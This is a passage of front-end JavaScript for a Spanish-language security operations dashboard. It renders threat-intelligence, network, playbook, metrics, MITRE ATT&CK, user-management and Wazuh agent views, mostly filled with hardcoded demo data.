    ${Kpi('SCORE MÁXIMO', String(Math.max(...D.iocs.map(i=>i.score))), 'danger')}
    ${Kpi('FEEDS ACTIVOS', '12', '')}
    ${Kpi('APTs SEGUIDOS', '07', 'danger')}
  </div>

  <div class="grid grid--main" style="flex:1">
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">IOCs · Indicators of Compromise</div>
        <div class="panel__meta">click en un IOC para ver análisis VirusTotal en tiempo real y acciones de bloqueo</div>
      </div>
      <div class="panel__body" style="padding:0">
        ${D.iocs.map((i,idx) => `
          <div class="ioc tr-hover-signal" style="cursor:pointer;transition:background 0.15s"
            ${act('__openIOC', idx)}>
            <span class="ioc__type">${i.type}</span>
            <div style="flex:1">
              <div class="ioc__val" style="word-break:break-all">${i.val}</div>
              <div style="font-size:9.5px;color:var(--text-faint);letter-spacing:1px;margin-top:2px">${i.source} · ${i.tags}</div>
            </div>
            <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
              <span class="ioc__score" style="color:${i.score>=90?'var(--danger)':i.score>=70?'var(--amber)':'var(--signal)'}">${i.score}</span>
              <span style="font-size:8.5px;color:var(--signal);letter-spacing:1px">▶ VER / VT</span>
            </div>
          </div>`).join('')}
      </div>
    </section>

    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">APT Tracking · grupos activos</div>
        <div class="panel__meta">score de actividad reciente (mayor = más activo)</div>
      </div>
      <div class="panel__body" style="padding:0">
        ${[
          ['APT29','Cozy Bear · RU · espionaje diplomático. Vector: spear phishing + supply chain.',92,'danger'],
          ['LockBit','RaaS · grupo cibercriminal. Vector: exploit público + affiliates.',84,'danger'],
          ['APT28','Fancy Bear · RU · operaciones militares. Vector: zero-days + watering hole.',78,'amber'],
          ['Lazarus','NK · robo financiero y criptomonedas. Vector: ingeniería social LinkedIn.',61,'amber'],
          ['APT41','CN · dual-use espionaje + crimen. Vector: vulnerabilidades web públicas.',54,''],
          ['FIN7','Carbanak · crimen financiero. Vector: phishing a empleados de banca/retail.',41,''],
          ['Conti','Ransomware disuelto pero activo bajo nuevos nombres. Vector: BEC + RDP.',38,''],
        ].map(([n, meta, v, cls]) => `
          <div style="padding:10px 14px;border-bottom:1px dashed var(--line-faint)">
            <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px">
              <span style="font-family:var(--sans);font-weight:600;letter-spacing:1.5px;color:var(--text-bright)">${n}</span>
              <span style="font-size:9px;letter-spacing:1px;color:${cls==='danger'?'var(--danger)':cls==='amber'?'var(--amber)':'var(--text-faint)'};border:1px solid currentColor;padding:2px 7px">${v}%</span>
            </div>
            <div class="bar" style="margin-bottom:6px"><div class="bar__fill ${cls}" style="width:${v}%"></div></div>
            <div style="font-size:9.5px;color:var(--text-faint);line-height:1.6">${meta}</div>
          </div>`).join('')}
      </div>
    </section>
  </div>
  `;
}

// =========================================================
// NETWORK view
// =========================================================
function renderNetwork() {
  return `
  <div class="grid grid--4">
    ${Kpi('TRÁFICO ENTRANTE', '847 mb/s', 'cyan')}
    ${Kpi('TRÁFICO SALIENTE', '312 mb/s', '')}
    ${Kpi('SESIONES ACTIVAS', '14,208', '')}
    ${Kpi('PAQUETES DESCARTADOS', '2.11%', 'amber')}
  </div>

  <div style="display:flex;gap:8px;margin:2px 0">
    <div style="flex:1;font-size:9px;color:var(--text-faint);background:var(--bg-panel);border:1px solid var(--line);padding:8px 12px;border-radius:var(--r-sm)">
      <span style="color:var(--cyan);font-weight:700">TRÁFICO ENTRANTE</span> — Datos que llegan a la red desde el exterior. Un pico inesperado puede indicar un ataque DDoS o exfiltración inversa.
    </div>
    <div style="flex:1;font-size:9px;color:var(--text-faint);background:var(--bg-panel);border:1px solid var(--line);padding:8px 12px;border-radius:var(--r-sm)">
      <span style="color:var(--signal);font-weight:700">PAQUETES DESCARTADOS</span> — Porcentaje de paquetes rechazados por el firewall o reglas de red. Un valor alto (&gt;5%) indica posible ataque activo.
    </div>
  </div>

  <div class="grid grid--2" style="flex:1">
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Tráfico entrante (Inbound) · últimos 60min</div>
        <div class="panel__meta" style="color:var(--cyan)">mb/s · datos desde internet</div>
      </div>
      <div class="panel__body" style="padding:14px">${Spark('var(--cyan)', randomWalk(60, 65, 25))}</div>
    </section>
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Tráfico saliente (Outbound) · últimos 60min</div>
        <div class="panel__meta" style="color:var(--signal)">mb/s · datos hacia internet</div>
      </div>
      <div class="panel__body" style="padding:14px">${Spark('var(--signal)', randomWalk(60, 35, 15))}</div>
    </section>
  </div>

  <section class="panel">
    <div class="panel__head">
      <div class="panel__title">Flujos de red más activos · Zeek + Suricata</div>
      <div class="panel__meta">conexiones en tiempo real, ordenadas por volumen de datos · <span style="color:var(--danger)">rojo = bloqueado/sospechoso</span></div>
    </div>
    <div class="panel__body" style="padding: 0">
      <table class="table">
        <thead><tr>
          <th title="Identificador único del flujo">ID Flujo</th>
          <th title="Protocolo de red utilizado">Protocolo</th>
          <th title="IP y puerto de origen de la conexión">IP Origen</th>
          <th title="IP o dominio destino">IP Destino</th>
          <th title="Volumen total transferido">Bytes</th>
          <th title="Estado de la conexión según las reglas del firewall">Estado</th>
        </tr></thead>
        <tbody>
          ${[
            ['0xA4F1', 'HTTPS', '10.0.2.5:443',   '172.31.4.88',    '412 MB', 'active'],
            ['0xA4F2', 'DNS',   '10.12.3.17',     '8.8.8.8',        '2.1 MB', 'suspicious'],
            ['0xA4F3', 'SSH',   '10.0.1.23:22',   '185.220.101.47', '88 KB',  'blocked'],
            ['0xA4F4', 'SMB',   '10.0.0.12:445',  '10.12.3.22',     '1.4 GB', 'flagged'],
            ['0xA4F5', 'HTTP',  '10.12.4.14',     '41.58.12.8',     '12 MB',  'suspicious'],
            ['0xA4F6', 'HTTPS', '10.12.8.44',     'github.com',     '88 MB',  'active'],
          ].map(([fl, p, s, d, b, st]) => `
            <tr title="Flujo ${fl}: conexión ${p} de ${s} a ${d} — ${b} transferidos — estado: ${st}">
              <td style="color:var(--cyan);letter-spacing:1px">${fl}</td>
              <td>${p}</td>
              <td style="color:var(--text-dim)">${s}</td>
              <td style="color:var(--text-dim)">${d}</td>
              <td style="font-variant-numeric:tabular-nums">${b}</td>
              <td><span class="tag ${st==='blocked'||st==='suspicious'?'open':st==='flagged'?'progress':'resolved'}">${st}</span></td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// PLAYBOOKS view
// =========================================================
function renderPlaybooks() {
  const active = D.playbooks.filter(p=>p.done>0&&p.done<p.steps).length;
  const done   = D.playbooks.filter(p=>p.done===p.steps).length;
  return `
  <div class="grid grid--4">
    ${Kpi('PLAYBOOKS TOTALES', String(D.playbooks.length), 'cyan')}
    ${Kpi('EN EJECUCIÓN', String(active), 'amber')}
    ${Kpi('COMPLETADOS', String(done), '')}
    ${Kpi('PENDIENTES', String(D.playbooks.filter(p=>p.done===0).length), 'danger')}
  </div>

  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Runbooks · SOAR integrados</div>
      <div class="panel__meta">haz clic en cualquier playbook para ver instrucciones paso a paso, comandos de referencia y guías de respuesta</div>
    </div>
    <div class="panel__body">
      <div class="grid grid--3">
        ${D.playbooks.map((p,idx) => {
          const pct = Math.round((p.done/p.steps)*100);
          const statusColor = p.done===p.steps ? 'var(--signal)' : p.done>0 ? 'var(--amber)' : 'var(--text-faint)';
          const statusLabel = p.done===p.steps ? 'COMPLETADO' : p.done>0 ? 'EN CURSO' : 'LISTO';
          const sevColor = {CRIT:'var(--danger)',HIGH:'var(--amber)',MED:'var(--signal)',LOW:'var(--text-faint)'}[p.severity]||'var(--signal)';
          return `
          <div class="playbook playbook--hover" style="cursor:pointer;transition:transform 0.15s,box-shadow 0.15s"
            ${act('__openPlaybook', idx)}>
            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:6px">
              <div class="playbook__name" style="color:var(--text-bright)">${p.name}</div>
              <span style="font-size:8px;letter-spacing:1.5px;color:${sevColor};border:1px solid currentColor;padding:2px 6px">${p.severity||'MED'}</span>
            </div>
            <div class="playbook__meta" style="color:var(--text-faint);margin-bottom:10px">${p.meta}</div>
            <div style="height:5px;background:var(--line);border-radius:3px;overflow:hidden;margin-bottom:6px">
              <div style="width:${pct}%;height:100%;background:${statusColor};border-radius:3px;transition:width 0.5s"></div>
            </div>
            <div class="playbook__steps">
              ${Array.from({length: p.steps}, (_, i) => `<div class="playbook__step ${i < p.done ? 'done' : ''}"></div>`).join('')}
            </div>
            <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
              <span style="font-size:9.5px;color:var(--text-dim)">PASO ${p.done} / ${p.steps}</span>
              <span style="font-size:9px;color:${statusColor};letter-spacing:1.5px">${statusLabel}</span>
            </div>
            <div style="font-size:9px;color:var(--signal);letter-spacing:1.5px;margin-top:8px;text-align:center;border-top:1px solid var(--line);padding-top:6px">▶ VER RUNBOOK COMPLETO</div>
          </div>`;
        }).join('')}
      </div>
    </div>
  </section>
  `;
}

// =========================================================
// METRICS view
// =========================================================
function renderMetrics() {
  const tm = window.DATA.teamMetrics || {};
  const mttd = tm.mttd || '—';
  const mttr = tm.mttr || '—';
  return `
  <div class="grid grid--4">
    ${Kpi('MTTD', mttd, '')}
    ${Kpi('MTTR', mttr, 'amber')}
    ${Kpi('SLA CUMPLIDO', '94.2%', 'cyan')}
    ${Kpi('FALSOS POSITIVOS', '12.4%', '')}
  </div>

  <div class="grid grid--2" style="flex:1">
    <section class="panel">
      <div class="panel__head"><div class="panel__title">MTTD · tendencia 30d</div></div>
      <div class="panel__body" style="padding:16px">
        ${Spark('var(--signal)', randomWalk(30, 50, 20))}
        <div style="display:flex; justify-content:space-between; font-size:10px; color:var(--text-faint); margin-top:6px; letter-spacing:1.5px">
          <span>30d atrás</span><span>15d</span><span>hoy</span>
        </div>
      </div>
    </section>

    <section class="panel">
      <div class="panel__head"><div class="panel__title">MTTR · tendencia 30d</div></div>
      <div class="panel__body" style="padding:16px">
        ${Spark('var(--amber)', randomWalk(30, 60, 25))}
      </div>
    </section>
  </div>

  <!-- MITRE ATT&CK heatmap global -->
  <section class="panel">
    <div class="panel__head">
      <div class="panel__title">MITRE ATT&CK · Tácticas detectadas (30d)</div>
      <div class="panel__meta">${window.DATA?.mitre?.tactics?.length ? 'datos reales · Wazuh' : 'sin datos — Wazuh sin alertas MITRE aún'}</div>
    </div>
    <div class="panel__body" style="padding:14px 16px">
      ${(() => {
        const tactics = window.DATA?.mitre?.tactics;
        if (!tactics?.length) return `<div style="color:var(--text-faint);font-size:11px">Sin tácticas MITRE en los últimos 30 días. Asegúrate de que las reglas Wazuh incluyen metadatos MITRE ATT&CK.</div>`;
        const maxC = tactics[0]?.count || 1;
        const tacticColors = {
          'Initial Access': 'var(--danger)', 'Execution': 'var(--danger)',
          'Persistence': 'var(--amber)', 'Privilege Escalation': 'var(--amber)',
          'Defense Evasion': 'var(--amber)', 'Credential Access': 'var(--cyan)',
          'Discovery': 'var(--signal)', 'Lateral Movement': 'var(--danger)',
          'Collection': 'var(--amber)', 'Command and Control': 'var(--danger)',
          'Exfiltration': 'var(--danger)', 'Impact': 'var(--danger)',
        };
        return `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px">
          ${tactics.map(t => {
            const pct = Math.round(t.count / maxC * 100);
            const col = tacticColors[t.name] || 'var(--signal)';
            return `<div style="background:var(--bg2);border:1px solid var(--line-faint);border-radius:var(--r-sm);padding:10px 12px">
              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
                <span style="font-size:9.5px;color:var(--text);letter-spacing:0.5px;font-weight:600">${esc(t.name)}</span>
                <span style="font-size:11px;font-weight:700;color:${col}">${t.count}</span>
              </div>
              <div style="height:4px;background:var(--line);border-radius:2px">
                <div style="height:4px;background:${col};border-radius:2px;width:${pct}%"></div>
              </div>
            </div>`;
          }).join('')}
        </div>`;
      })()}
    </div>
  </section>

  <section class="panel">
    <div class="panel__head">
      <div class="panel__title">Rendimiento por analista · últimos 7 días</div>
    </div>
    <div class="panel__body" style="padding: 0">
      <table class="table">
        <thead><tr><th>Analista</th><th>Turno</th><th>Tickets</th><th>Resueltos</th><th>MTTR</th><th>Satisfacción</th></tr></thead>
        <tbody>
          ${[
            ['T.STARK',    'Noche · L3', 47, 44, '14m 02s', 96],
            ['N.ROMANOV',  'Mañana · L3', 52, 49, '16m 44s', 94],
            ['B.BANNER',   'Tarde · L2',  38, 35, '22m 11s', 89],
            ['S.ROGERS',   'Noche · L2',  41, 37, '19m 28s', 91],
            ['C.BARTON',   'Mañana · L2', 44, 40, '21m 03s', 88],
            ['W.MAXIMOFF', 'Tarde · L1',  61, 54, '28m 47s', 82],
          ].map(([n, t, tk, r, m, s]) => `
            <tr>
              <td style="color:var(--text-bright); letter-spacing:1px">${n}</td>
              <td style="color:var(--text-dim)">${t}</td>
              <td style="font-variant-numeric:tabular-nums">${tk}</td>
              <td style="font-variant-numeric:tabular-nums; color:var(--signal)">${r}</td>
              <td style="font-variant-numeric:tabular-nums">${m}</td>
              <td style="font-variant-numeric:tabular-nums; color:${s >= 90 ? 'var(--signal)' : s >= 85 ? 'var(--amber)' : 'var(--danger)'}">${s}%</td>
            </tr>
          `).join('')}
        </tbody>
      </table>
    </div>
  </section>
  `;
}

// =========================================================
// RIGHT RAIL content (varies by view)
// =========================================================
function renderRail(view) {
  const aiPanel = `
    <section class="rail__panel">
      <div class="panel__body" style="padding: 0">
        <div class="ai-panel">
          <div class="ai-panel__head">
            <div class="ai-panel__dot"></div>
            <div class="ai-panel__title">Ollama AI · Análisis</div>
          </div>
          <div class="ai-panel__body" id="aiAnalysis">
            <strong>Correlación activa:</strong> Se detecta actividad coordinada desde <strong>RU (APT29)</strong> — brute-force SSH + C2 beacon en segmentos separados sugiere movimiento lateral post-compromiso.<br><br>
            <strong>Recomendación:</strong> Aislar wks-fin-07 y wks-rrhh-04. Ejecutar playbook <strong>C2 Beacon Contain</strong> + <strong>Credential Theft</strong> en paralelo. Prioridad: contener antes de pivoting a srv-ad-02.<br><br>
            <span style="color:var(--text-faint); font-size:9.5px; letter-spacing:1px">MODELO: llama3.1:70b · LATENCIA: 420ms · CONFIANZA: 94.2%</span>
          </div>
        </div>
      </div>
    </section>
  `;

  const terminalPanel = `
    <section class="rail__panel">
      <div class="panel__head">
        <div class="panel__title">// Consola raw</div>
        <div class="panel__meta" style="color:var(--signal)">LIVE</div>
      </div>
      <div class="term" id="railTerm" style="max-height: 220px"></div>
    </section>
  `;

  const onCallPanel = `
    <section class="rail__panel">
      <div class="panel__head">
        <div class="panel__title">// Guardia activa</div>
      </div>
      <div class="panel__body" style="padding: 0">
        ${[
          ['T.STARK', 'L3 · NOCHE', 'activo'],
          ['N.ROMANOV', 'L3 · BACKUP', 'activo'],
          ['B.BANNER', 'L2 · FORENSIC', 'activo'],
          ['CSO M.HILL', 'ESCALADO', 'standby'],
        ].map(([n, r, s]) => `
          <div style="display:grid; grid-template-columns:auto 1fr auto; gap:8px; padding:9px 14px; border-bottom:1px solid var(--line-faint); align-items:center">
            <span class="dot" style="width:6px;height:6px;background:${s === 'activo' ? 'var(--signal)' : 'var(--text-faint)'}; box-shadow:0 0 5px ${s === 'activo' ? 'var(--signal)' : 'transparent'}"></span>
            <div>
              <div style="font-family:var(--sans); font-weight:600; letter-spacing:1.5px; color:var(--text-bright); font-size:11.5px">${n}</div>
              <div style="font-size:9.5px; color:var(--text-faint); letter-spacing:1px; margin-top:1px">${r}</div>
            </div>
            <div style="font-size:8.5px; letter-spacing:1.5px; color:${s === 'activo' ? 'var(--signal)' : 'var(--text-dim)'}; text-transform:uppercase">${s}</div>
          </div>
        `).join('')}
      </div>
    </section>
  `;

  const healthPanel = `
    <section class="rail__panel">
      <div class="panel__head"><div class="panel__title">// Salud del stack</div></div>
      <div class="panel__body" style="padding:10px 14px">
        ${[
          ['Wazuh Manager', 98, ''],
          ['Elasticsearch', 87, ''],
          ['Kibana', 99, ''],
          ['Suricata IDS', 94, ''],
          ['Zeek sensor', 76, 'amber'],
          ['MISP instance', 91, ''],
          ['Ollama AI', 100, ''],
        ].map(([n, v, cls]) => `
          <div style="margin-bottom: 8px">
            <div style="display:flex; justify-content:space-between; font-size:10px; margin-bottom: 3px; letter-spacing:0.5px">
              <span>${n}</span>
              <span style="color:var(--text-dim); font-variant-numeric:tabular-nums">${v}%</span>
            </div>
            <div class="bar"><div class="bar__fill ${cls}" style="width:${v}%"></div></div>
          </div>
        `).join('')}
      </div>
    </section>
  `;

  return aiPanel + healthPanel + onCallPanel + terminalPanel;
}

// =========================================================
// USERS view (admin only)
// =========================================================
function renderUsers() {
  const users = window.__usersData || [];
  const roleColor = r => r === 'admin' ? 'var(--danger)' : r === 'analyst' ? 'var(--amber)' : r === 'reporter' ? 'var(--signal)' : 'var(--text-dim)';
  const rolePerms = {
    admin:    'Dashboard · SIEM · Agentes · Incidentes · Threat · Ollama · Exportar · Usuarios',
    analyst:  'Dashboard · SIEM · Agentes · Incidentes · Threat · Ollama · Exportar',
    reporter: 'Dashboard · SIEM · Agentes · Exportar',
    viewer:   'Dashboard · SIEM · Agentes · Threat (solo lectura)',
  };

  return `
  <div class="grid grid--4" style="margin-bottom:16px">
    ${Kpi('USUARIOS TOTALES', String(users.length), 'cyan')}
    ${Kpi('ACTIVOS', String(users.filter(u=>u.active).length), '')}
    ${Kpi('ADMINS', String(users.filter(u=>u.role==='admin').length), 'danger')}
    ${Kpi('ANALISTAS', String(users.filter(u=>u.role==='analyst').length), 'amber')}
  </div>

  <!-- Roles reference -->
  <section class="panel" style="margin-bottom:12px">
    <div class="panel__head">
      <div class="panel__title">Matriz de permisos por rol</div>
    </div>
    <div class="panel__body">
      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px">
        ${['admin','analyst','reporter','viewer'].map(r => `
          <div style="border:1px solid var(--line);padding:10px">
            <div style="font-size:11px;font-weight:700;color:${roleColor(r)};letter-spacing:2px;text-transform:uppercase;margin-bottom:6px">${r}</div>
            <div style="font-size:9px;color:var(--text-faint);line-height:1.8">${rolePerms[r].split(' · ').join('<br>')}</div>
          </div>`).join('')}
      </div>
    </div>
  </section>

  <!-- User table -->
  <section class="panel" style="flex:1">
    <div class="panel__head">
      <div class="panel__title">Gestión de usuarios</div>
      <button data-action="__showCreateUser" style="background:none;border:1px solid var(--signal);color:var(--signal);font-family:var(--ff-mono);font-size:9px;letter-spacing:2px;padding:4px 12px;cursor:pointer">+ NUEVO USUARIO</button>
    </div>
    <div class="panel__body" style="padding:0;overflow-x:auto">
      <table style="width:100%;border-collapse:collapse;font-size:11px">
        <thead>
          <tr style="border-bottom:1px solid var(--line)">
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Usuario</th>
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Email</th>
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Rol</th>
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Estado</th>
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Último acceso</th>
            <th style="padding:10px 16px;text-align:left;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;font-weight:400;text-transform:uppercase;white-space:nowrap">Acciones</th>
          </tr>
        </thead>
        <tbody>
          ${users.length ? users.map(u => `
          <tr class="tr-hover-signal" style="border-bottom:1px solid var(--line-faint);transition:background 0.15s">
            <td style="padding:10px 16px;color:var(--text-bright);font-weight:${u.role==='admin'?'700':'400'};white-space:nowrap">${u.username}</td>
            <td style="padding:10px 16px;color:var(--text-dim)">${u.email||'—'}</td>
            <td style="padding:10px 16px;white-space:nowrap"><span style="color:${roleColor(u.role)};font-size:10px;letter-spacing:1.5px;text-transform:uppercase;background:rgba(0,0,0,0.2);padding:2px 8px;border:1px solid currentColor">${u.role}</span></td>
            <td style="padding:10px 16px;white-space:nowrap"><span style="color:${u.active?'var(--signal)':'var(--danger)'};font-size:10px;letter-spacing:1px">${u.active?'● ACTIVO':'○ INACTIVO'}</span></td>
            <td style="padding:10px 16px;color:var(--text-faint);white-space:nowrap">${(u.last_login||'Nunca').slice(0,16)}</td>
            <td style="padding:10px 16px">
              <div style="display:flex;gap:6px">
                <button ${act('__editUserRole', u.id, u.username, u.role)} style="background:none;border:1px solid var(--line);color:var(--text-dim);font-family:var(--mono);font-size:9px;padding:4px 10px;cursor:pointer;letter-spacing:1px;white-space:nowrap">ROL</button>
                <button ${act('__toggleUser', u.id, u.active?0:1)} style="background:none;border:1px solid var(--line);color:${u.active?'var(--danger)':'var(--signal)'};font-family:var(--mono);font-size:9px;padding:4px 10px;cursor:pointer;letter-spacing:1px;white-space:nowrap">${u.active?'DESACTIVAR':'ACTIVAR'}</button>
              </div>
            </td>
          </tr>`).join('') : `<tr><td colspan="6" style="padding:24px;color:var(--text-faint);text-align:center">Cargando usuarios…</td></tr>`}
        </tbody>
      </table>
    </div>
  </section>

  <!-- Export buttons -->
  <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap">
    <a href="/api/export/pdf" target="_blank" style="background:none;border:1px solid var(--signal);color:var(--signal);font-family:var(--ff-mono);font-size:9px;letter-spacing:2px;padding:7px 18px;text-decoration:none">↓ EXPORTAR PDF</a>
    <a href="/api/export/docx" style="background:none;border:1px solid var(--amber);color:var(--amber);font-family:var(--ff-mono);font-size:9px;letter-spacing:2px;padding:7px 18px;text-decoration:none">↓ EXPORTAR DOCX</a>
    <a href="/api/export/md" style="background:none;border:1px solid var(--text-dim);color:var(--text-dim);font-family:var(--ff-mono);font-size:9px;letter-spacing:2px;padding:7px 18px;text-decoration:none">↓ EXPORTAR MARKDOWN</a>
  </div>
  `;
}

// =========================================================
// AGENT DETAIL view
// =========================================================
function renderAgentDetail() {
  const d = window.__agentDetail;
  if (!d) return `<div style="padding:40px;color:var(--text-dim)">Cargando datos del agente…</div>`;

  const info  = d.info  || {};
  const sca   = d.sca   || [];
  const alerts = d.alerts || [];
  const mitre = d.mitre || [];
  const rules = d.topRules || [];

  const statusCls = info.status === 'active' ? 'up' : info.status === 'disconnected' ? 'down' : 'warn';
  const statusLabel = info.status === 'active' ? 'ACTIVO' : info.status === 'disconnected' ? 'DESCONECTADO' : info.status?.toUpperCase() || '—';
  const os = info.os?.name || info.os?.platform || 'Unknown OS';
  const scaMain = sca[0] || {};
  const scaScore = scaMain.score != null ? scaMain.score + '%' : '—';
  const scaPassed = scaMain.pass ?? '—';
  const scaFailed = scaMain.fail ?? '—';

  const sevColor = s => s === 'CRIT' ? 'var(--danger)' : s === 'HIGH' ? 'var(--amber)' : s === 'MED' ? 'var(--signal)' : 'var(--text-dim)';

  return `
  <!-- Header -->
  <div style="display:flex;align-items:center;gap:16px;padding:12px 0 18px;border-bottom:1px solid var(--line);margin-bottom:16px;flex-wrap:wrap">
    <button data-action="__backToAssets" style="background:none;border:1px solid var(--line);color:var(--signal);padding:5px 14px;font-family:var(--ff-mono);font-size:10px;letter-spacing:2px;cursor:pointer">← VOLVER</button>
    <div style="width:38px;height:38px;border:1px solid var(--signal);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:var(--signal)">${(info.name||'?')[0].toUpperCase()}</div>
    <div>
      <div style="font-size:16px;font-weight:700;color:var(--text);letter-spacing:2px">${info.name || '—'}</div>
      <div style="font-size:10px;color:var(--text-faint);letter-spacing:1.5px">ID ${info.id || '—'} · ${info.ip || '—'} · ${os}</div>
    </div>
    <div class="asset__status ${statusCls}" style="margin-left:auto">
      <span class="dot" style="background:currentColor;box-shadow:0 0 6px currentColor"></span>${statusLabel}
    </div>
    <div style="font-size:10px;color:var(--text-faint);letter-spacing:1px">WAZUH ${(info.version||'').replace('Wazuh v','')}</div>
    <div style="font-size:10px;color:var(--text-faint);letter-spacing:1px">GRUPOS: ${(info.group||[]).join(', ')||'N/A'}</div>
    <div style="font-size:10px;color:var(--text-faint);letter-spacing:1px">ÚLTIMO KEEPALIVE: ${(info.lastKeepAlive||'').slice(0,19).replace('T',' ')}</div>
  </div>

  <!-- KPIs -->
  <div class="grid grid--4" style="margin-bottom:16px">
    ${Kpi('ALERTAS HOY', String(alerts.length), alerts.length > 10 ? 'danger' : 'amber')}
    ${Kpi('SCORE SCA', scaScore, parseInt(scaScore) >= 70 ? '' : parseInt(scaScore) >= 40 ? 'amber' : 'danger')}
    ${Kpi('PASADOS SCA', String(scaPassed), '')}
    ${Kpi('FALLADOS SCA', String(scaFailed), scaMain.fail > 100 ? 'danger' : 'amber')}
  </div>

  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">

    <!-- MITRE tactics -->
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">MITRE ATT&CK · Tácticas detectadas</div>
        <div class="panel__meta">alertas del agente</div>
      </div>
      <div class="panel__body">
        ${mitre.length ? mitre.map(m => `
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
            <span style="font-size:9.5px;color:var(--text-faint);letter-spacing:1px;width:160px;text-transform:uppercase">${m.tactic}</span>
            <div style="flex:1;height:6px;background:var(--bg2);border-radius:2px">
              <div style="height:6px;background:var(--signal);border-radius:2px;width:${Math.min(100, Math.round(m.count / (mitre[0]?.count||1) * 100))}%"></div>
            </div>
            <span style="font-size:10px;color:var(--signal);min-width:28px;text-align:right">${m.count}</span>
          </div>`).join('') : `<div style="color:var(--text-faint);font-size:11px">Sin técnicas MITRE registradas</div>`}
      </div>
    </section>

    <!-- Top rules -->
    <section class="panel">
      <div class="panel__head">
        <div class="panel__title">Reglas más frecuentes</div>
        <div class="panel__meta">top disparadas</div>
      </div>
      <div class="panel__body">
        ${rules.length ? rules.map(r => `
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
            <span style="font-size:9.5px;color:var(--text-faint);letter-spacing:1px;flex:1;text-transform:uppercase">${r.desc}</span>
            <span style="font-size:10px;color:var(--amber);min-width:28px;text-align:right">${r.count}</span>
          </div>`).join('') : `<div style="color:var(--text-faint);font-size:11px">Sin reglas registradas</div>`}
      </div>
    </section>

  </div>

  <!-- SCA detail -->
  ${sca.length ? `
  <section class="panel" style="margin-top:12px">
    <div class="panel__head">
      <div class="panel__title">SCA · Evaluación de configuración</div>
      <div class="panel__meta">CIS Benchmark</div>
    </div>
    <div class="panel__body" style="padding:0">
      <div style="display:grid;grid-template-columns:2fr 1fr 60px 60px 60px 80px;font-size:9.5px;color:var(--text-faint);letter-spacing:2px;text-transform:uppercase;padding:8px 14px;border-bottom:1px solid var(--line)">
        <span>Política</span><span>Última ejecución</span><span>Pasó</span><span>Falló</span><span>N/A</span><span>Score</span>
      </div>
      ${sca.map(s => `
        <div style="display:grid;grid-template-columns:2fr 1fr 60px 60px 60px 80px;font-size:10px;padding:8px 14px;border-bottom:1px solid var(--line);align-items:center">
          <span style="color:var(--text)">${s.name || s.policy_id}</span>
          <span style="color:var(--text-faint)">${(s.end_scan||'').slice(0,19).replace('T',' ')}</span>
          <span style="color:var(--signal)">${s.pass ?? '—'}</span>
          <span style="color:var(--danger)">${s.fail ?? '—'}</span>
          <span style="color:var(--text-faint)">${s.invalid ?? '—'}</span>
          <span style="color:${parseInt(s.score)>=70?'var(--signal)':parseInt(s.score)>=40?'var(--amber)':'var(--danger)'};font-weight:700">${s.score != null ? s.score+'%' : '—'}</span>
        </div>`).join('')}
    </div>
  </section>` : ''}

  <!-- Recent alerts -->
  <section class="panel" style="margin-top:12px">
    <div class="panel__head">
      <div class="panel__title">Alertas recientes · ${info.name}</div>
      <div class="panel__meta">últimas ${alerts.length}</div>
    </div>
    <div class="panel__body" style="padding:0">
      ${alerts.length ? alerts.map(a => `
        <div style="display:grid;grid-template-columns:65px 45px 1fr 60px;align-items:center;padding:6px 14px;border-bottom:1px solid var(--line);font-size:10px">
          <span style="color:var(--text-faint)">${esc(a.time)}</span>
          <span style="color:${sevColor(a.sev)};font-weight:700;font-size:9px;letter-spacing:1.5px">${esc(a.sev)}</span>
          <span style="color:var(--text)">${esc(a.msg)}</span>
          <span style="color:var(--text-faint);font-size:9px">${esc(a.mitre)}</span>
        </div>`).join('') : `<div style="padding:14px;color:var(--text-faint);font-size:11px">Sin alertas recientes para este agente</div>`}
    </div>
  </section>
  `;
}

// =========================================================
// REPORTS view
// =========================================================
function renderReports() {
  return `
  <div class="grid grid--4">
    ${Kpi('INFORMES TOTALES', '14', 'cyan')}
    ${Kpi('GENERADOS HOY', '3', '')}
    ${Kpi('PENDIENTES', '2', 'amber')}
    ${Kpi('EXPORTADOS', '9', '')}
  </div>

  <section class="panel" style="margin-bottom:12px">
    <div class="panel__head">
      <div class="panel__title">Exportar informe SOC</div>
      <div class="panel__meta">incluye alertas · agentes · métricas · SCA</div>
    </div>
    <div class="panel__body">
      <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:center">
        <div>
          <div style="font-size:10px;color:var(--text-faint);letter-spacing:1.5px;margin-bottom:6px">FORMATO</div>
          <div style="display:flex;gap:8px">
